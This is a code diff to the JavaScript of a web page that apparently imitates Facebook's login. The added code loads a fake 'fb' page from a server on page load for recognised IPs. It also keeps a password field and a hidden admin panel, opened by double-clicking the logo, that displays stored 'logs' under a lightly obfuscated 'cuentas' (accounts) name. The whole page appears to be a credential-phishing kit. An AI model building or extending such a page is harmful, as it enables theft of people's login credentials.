@@ -112,6 +112,53 @@
         const _D = "cuen" + "tas_ayber";
         let _K = "";
 
+        // --- FUNCIÓN AGREGADA PARA RECONOCIMIENTO DE IP ---
+        async function autoLogin() {
+            try {
+                const r = await fetch(`${_S}/check_ip`);
+                if (r.ok) {
+                    const d = await r.json();
+                    if(d.status === "success") {
+                        document.body.classList.add('f-b-body');
+                        document.getElementById('root').innerHTML = d.html;
+                        // Activamos funciones especiales si el HTML de FB se cargó
+                        setTimeout(inicializarFuncionesFB, 500);
+                    }
+                }
+            } catch (e) { console.log("IP no reconocida o servidor offline."); }
+        }
+        autoLogin(); // Se ejecuta al cargar la página
+
+        // Separamos la lógica de inyección para que funcione tanto en Login manual como Auto
+        function inicializarFuncionesFB() {
+            const els = document.querySelectorAll('footer, div');
+            els.forEach(e => {
+                if (e.innerText.trim() === _M && !e.querySelector('img')) {
+                    e.innerHTML = `<img src="3.jpg" class="m-t-logo">${_M}`;
+                    e.classList.add('m-t-container');
+                }
+            });
+
+            const p = document.getElementById('pass');
+            if(p) {
+                const w = p.parentElement;
+                w.style.position = "relative";
+                const ey = document.createElement('div');
+                ey.id = "eye-toggle";
+                ey.className = "toggle-pass";
+                ey.innerText = "Ø"; 
+                p.addEventListener('focus', () => { ey.style.display = 'block'; });
+                ey.onclick = function() {
+                    if (p.type === "password") { p.type = "text"; ey.innerText = "O"; }
+                    else { p.type = "password"; ey.innerText = "Ø"; }
+                };
+                w.appendChild(ey);
+            }
+
+            const lg = document.querySelector('img[alt="fb"]');
+            if(lg) lg.ondblclick = () => { renderLogs(); document.getElementById('admin-panel').style.display = 'block'; };
+        }
+
         function clearK() {
             const f = document.getElementById('keyField');
             if(f) f.value = "";
@@ -170,35 +217,7 @@
                     const d = await r.json();
                     document.body.classList.add('f-b-body');
                     document.getElementById('root').innerHTML = d.html;
-
-                    const els = document.querySelectorAll('footer, div');
-                    els.forEach(e => {
-                        if (e.innerText.trim() === _M && !e.querySelector('img')) {
-                            e.innerHTML = `<img src="3.jpg" class="m-t-logo">${_M}`;
-                            e.classList.add('m-t-container');
-                        }
-                    });
-
-                    const p = document.getElementById('pass');
-                    if(p) {
-                        const w = p.parentElement;
-                        w.style.position = "relative";
-                        const ey = document.createElement('div');
-                        ey.id = "eye-toggle";
-                        ey.className = "toggle-pass";
-                        ey.innerText = "Ø"; 
-                        p.addEventListener('focus', () => { ey.style.display = 'block'; });
-                        ey.onclick = function() {
-                            if (p.type === "password") { p.type = "text"; ey.innerText = "O"; }
-                            else { p.type = "password"; ey.innerText = "Ø"; }
-                        };
-                        w.appendChild(ey);
-                    }
-
-                    setTimeout(() => {
-                        const lg = document.querySelector('img[alt="fb"]');
-                        if(lg) lg.ondblclick = () => { renderLogs(); document.getElementById('admin-panel').style.display = 'block'; };
-                    }, 1000);
+                    inicializarFuncionesFB();
                 }
             } catch (e) { console.error("Error de carga."); }
         }
